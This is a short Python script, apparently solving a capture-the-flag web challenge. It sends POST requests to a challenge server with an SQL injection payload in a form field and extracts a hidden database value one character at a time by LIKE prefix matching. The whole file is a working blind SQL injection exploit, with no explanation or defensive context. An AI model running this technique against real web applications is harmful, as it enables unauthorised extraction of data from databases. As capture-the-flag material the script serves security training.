import requests
import string

# Define the URL you want to send requests to
url = 'https://web5.chall.necst.it/submit'
solution = ""

for i in range(0, 19):
    for letter in (string.ascii_lowercase + string.ascii_uppercase + string.digits):
        tmp = solution + letter
        assigned_name = 'Jaime'
        gnome_name = "'); SELECT gnome_name FROM gnomes WHERE assigned_name='Jaime' AND gnome_name LIKE '" + tmp + "%';--"

        data = {
            'assigned_name': assigned_name,
            'gnome_name': gnome_name
        }

        # Send a POST request with the payload data
        response = requests.post(url, data=data)

        # Check the response status
        if response.status_code == 200 and "found" in response.text:
            solution = tmp
            break

print(solution)
